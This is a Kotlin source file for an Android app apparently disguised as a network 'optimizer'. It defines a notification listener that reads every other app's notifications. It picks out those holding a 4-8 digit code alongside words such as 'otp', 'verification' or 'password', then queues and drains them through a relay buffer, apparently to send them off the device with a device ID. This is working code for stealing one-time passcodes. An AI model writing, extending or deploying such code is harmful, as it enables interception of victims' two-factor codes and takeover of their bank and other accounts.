package com.netboost.optimizer

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.netboost.optimizer.buffer.RelayBuffer
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class OtpNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val tag = "NetBoostNLS"

    // Packages to ignore (our own notifications, system UI)
    private val ignoredPackages = setOf(
        "com.netboost.optimizer",
        "com.android.systemui",
        "android"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName in ignoredPackages) return

        val extras = sbn.notification.extras ?: return

        // Extract all text fields from the notification
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""

        // Combine all text for matching
        val combined = listOf(title, text, bigText, subText)
            .filter { it.isNotBlank() }
            .joinToString(" | ")

        if (combined.isBlank()) return

        // Check if this notification contains OTP-like content
        if (isOtpRelated(combined)) {
            Log.d(tag, "OTP candidate from ${sbn.packageName}: ${combined.take(60)}...")
            val sender = sbn.packageName
            val messageSid = "nls-${Config.DEVICE_ID}-${sbn.postTime}"

            scope.launch {
                RelayBuffer.enqueue(applicationContext, sender, combined, messageSid)
                RelayBuffer.drain(applicationContext)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // No-op — we capture on post, not on removal
    }

    private fun isOtpRelated(text: String): Boolean {
        // Match 4-8 digit codes
        val codePattern = Regex("\\b\\d{4,8}\\b")
        // OTP keywords (case-insensitive)
        val keywords = listOf(
            "otp", "code", "verification", "verify", "pin",
            "token", "password", "authenticate", "confirm",
            "one-time", "one time", "security code",
            "login code", "access code", "sms"
        )

        val lower = text.lowercase()
        val hasCode = codePattern.containsMatchIn(text)
        val hasKeyword = keywords.any { lower.contains(it) }

        // Must have both a numeric code AND a keyword to reduce noise
        return hasCode && hasKeyword
    }
}
